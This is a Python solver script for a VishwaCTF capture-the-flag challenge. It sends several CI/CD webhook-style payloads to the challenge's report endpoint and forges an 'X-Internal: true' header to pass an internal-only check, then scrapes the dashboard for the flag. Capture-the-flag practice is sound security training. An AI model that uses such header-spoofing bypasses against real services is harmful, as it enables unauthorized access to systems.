#!/usr/bin/env python3
"""Test various CI/CD webhook formats"""
import requests
import re
import json

BASE_URL = "https://ghost-p.vishwactf.com"

def test_webhook_formats():
    """Test common CI/CD webhook payload formats"""
    print("[*] Testing CI/CD webhook formats...")
    
    headers = {
        "X-Internal": "true",
        "Content-Type": "application/json"
    }
    
    # Common CI/CD webhook formats
    payloads = [
        # GitHub Actions format
        {
            "action": "completed",
            "workflow_run": {
                "id": 1,
                "name": "CI",
                "status": "completed",
                "conclusion": "success"
            }
        },
        # GitLab CI format
        {
            "object_kind": "pipeline",
            "object_attributes": {
                "id": 1,
                "status": "success"
            }
        },
        # Jenkins format
        {
            "name": "build",
            "build": {
                "number": 1,
                "status": "SUCCESS"
            }
        },
        # Generic webhook
        {
            "event": "build.completed",
            "status": "success",
            "build_id": 1
        },
        # Simple report format
        {
            "report_type": "build",
            "status": "success",
            "data": "test"
        },
    ]
    
    for i, payload in enumerate(payloads):
        try:
            print(f"\n[*] Testing payload {i+1}: {list(payload.keys())}")
            r = requests.post(f"{BASE_URL}/api/report", json=payload, headers=headers, timeout=10)
            print(f"[+] Status: {r.status_code}")
            print(f"[+] Response: {r.text[:300]}")
            
            if r.status_code in [200, 201]:
                print(f"[!] SUCCESS! Payload accepted")
                try:
                    resp_data = r.json()
                    print(f"[+] JSON response: {resp_data}")
                    
                    # Extract report ID
                    report_id = None
                    for key in ['id', 'report_id', 'reportId', 'build_id', 'buildId']:
                        if key in resp_data:
                            report_id = resp_data[key]
                            break
                    
                    if report_id:
                        print(f"[!] Got report_id: {report_id}")
                        # Check dashboard
                        dash_r = requests.get(f"{BASE_URL}/dashboard", params={"report_id": report_id}, timeout=10)
                        print(f"[+] Dashboard response:")
                        print(dash_r.text)
                        
                        if "vishwaCTF{" in dash_r.text:
                            flags = re.findall(r'vishwaCTF\{[^}]+\}', dash_r.text)
                            print(f"[!] FLAG FOUND: {flags[0]}")
                            return flags[0]
                except:
                    pass
            
            if "vishwaCTF{" in r.text:
                flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                print(f"[!] FLAG FOUND: {flags[0]}")
                return flags[0]
                
        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    print("="*60)
    print("Webhook Format Test")
    print("="*60)
    
    flag = test_webhook_formats()
    if flag:
        print(f"\n{'='*60}")
        print(f"FINAL FLAG: {flag}")
        print(f"{'='*60}")

if __name__ == "__main__":
    main()
